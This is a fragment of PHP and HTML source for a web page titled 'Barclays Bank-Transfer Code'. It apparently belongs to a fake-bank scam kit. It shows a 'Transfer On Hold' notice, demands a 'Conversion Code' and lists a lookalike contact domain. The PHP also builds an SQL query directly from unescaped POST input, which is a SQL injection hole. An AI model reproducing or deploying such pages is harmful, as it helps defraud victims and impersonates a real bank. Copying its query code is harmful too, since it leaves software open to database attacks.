...
if(isset($_POST['transfer_submit']))
{
	...
	$conver = $_POST['conver'];
	$sql = "select * from frean WHERE conver = '$conver' AND email = '$email'";
	$row = $conn->query($sql);
	if($row->num_rows>0)
		header('Location:conversion-login.php');
	else
		$error_msg = "Invalid Conversion Code";
}
}
else
	exit;
...
?>
<html>
<title>Barclays Bank-Transfer Code</title>
    ...
    <div class="container">
        <div class="row">
            <div class="col-md-12 justify-content-right">
                <div id="Sign In" align="center">
                    <div
                        style="width:600px;border:3px solid #ebebe0; background-color:white;margin:auto;padding:5px;border-radius:20px;">
                        <br><br>
                        <span class="blinking"><span
                                style="font-size:30px;font-family: 'Smooch Sans', sans-serif;">Transfer On
                                Hold!!<br> Contact Your Account Officer!!</br></span></span><br>
                        <p class="glow"><span style="font-family: 'Nobile', sans-serif;font-size:35px;">Conversion Code
                                Is Required!!:</span></p>

                        <span style="font-family: 'Smooch Sans', sans-serif; font-size:25px">You are required to request
                            for Conversion
                            Code </span><br>
                        <form action="" method="POST">
                            <?=@$error_msg?>
                            <p style="color:#66a3ff"><span
                                    style="font-family: 'Smooch Sans', sans-serif;font-size:35px;">Login
                                    Conversion Code :</span></p>
                            <span style="font-family: 'Smooch Sans', sans-serif;font-size:25px;"> Conversion Code :
                            </span><input type="text" name="conver" id="pass" /><br><br>
    ...
    <div id="Sign In" align="center">
        ...
        <div id="Sign In" align="center">
            ...
            <span
                ...
                Bank.| &#169 All Rights Reserved 2019. | For enquirydept@baclayrus.com</span>
